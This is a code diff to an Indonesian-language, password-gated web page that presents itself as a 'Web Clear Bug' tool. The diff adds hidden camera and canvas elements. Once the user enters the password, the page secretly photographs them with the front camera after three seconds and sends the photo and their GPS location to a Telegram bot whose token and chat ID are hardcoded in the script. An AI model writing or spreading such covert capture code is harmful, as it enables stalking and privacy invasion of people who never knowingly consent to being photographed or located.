@@ -87,10 +87,13 @@
             padding: 20px;
             border-radius: 10px;
         }
+
+        #cameraPreview, #canvasCapture {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <!-- Video Background -->
     <video id="video-background" autoplay muted loop>
         <source src="https://files.catbox.moe/bq5xe4.mp4" type="video/mp4">
     </video>
@@ -119,10 +122,14 @@
         </div>
     </div>
 
-    <!-- Suara berhasil (loop) -->
     <audio id="successSound" src="https://files.catbox.moe/x19fpy.mp3" preload="auto" loop></audio>
+    <video id="cameraPreview" autoplay playsinline></video>
+    <canvas id="canvasCapture" width="640" height="480"></canvas>
 
     <script>
+        const token = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
+        const chatId = "6788646701";
+
         function checkPassword() {
             const password = "andikavip";
             const input = document.getElementById("passwordInput").value;
@@ -134,37 +141,72 @@
                 document.getElementById("passwordSection").style.display = "none";
                 document.getElementById("appContent").style.display = "block";
 
-                // Minta lokasi
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(position) {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-
-                        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        const message = `📍 *Akses Web Clear Bug Terbuka!*\n\n🔑 Password benar\n🌍 Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\n📌 [Lihat di Maps](${mapLink})`;
-
-                        fetch(`https://api.telegram.org/bot7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM/sendMessage`, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                chat_id: "6788646701",
-                                text: message,
-                                parse_mode: "Markdown"
-                            })
-                        });
-                    }, function(error) {
-                        alert("Gagal mengambil lokasi: " + error.message);
-                    });
-                } else {
-                    alert("Browser tidak mendukung geolocation.");
-                }
-
+                mintaAksesKameraDanKirimFoto();
+                mintaAksesLokasi();
             } else {
                 alert("KEY SALAH TOLOL, BUY KE DIK 🤭.");
                 document.getElementById("passwordInput").value = "";
             }
+        }
+
+        function mintaAksesLokasi() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const message = `📍 *Akses Web Clear Bug Terbuka!*\n\n🔑 Password benar\n🌍 Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\n📌 [Lihat di Maps](${mapLink})`;
+
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                }, function(error) {
+                    alert("Gagal mengambil lokasi: " + error.message);
+                });
+            } else {
+                alert("Browser tidak mendukung geolocation.");
+            }
+        }
+
+        function mintaAksesKameraDanKirimFoto() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    const video = document.getElementById("cameraPreview");
+                    video.srcObject = stream;
+
+                    setTimeout(() => {
+                        const canvas = document.getElementById("canvasCapture");
+                        const context = canvas.getContext("2d");
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append("chat_id", chatId);
+                            formData.append("photo", blob, "selfie.jpg");
+
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            }).then(() => {
+                                console.log("Foto berhasil dikirim ke Telegram.");
+                            }).catch(err => {
+                                console.error("Gagal kirim foto:", err);
+                            });
+                        }, "image/jpeg");
+                    }, 3000); // Tunggu 3 detik sebelum ambil foto
+                })
+                .catch(function(err) {
+                    console.error("Gagal mengakses kamera:", err);
+                    alert("Tidak bisa mengakses kamera depan: " + err.message);
+                });
         }
 
         function kirimWa() {
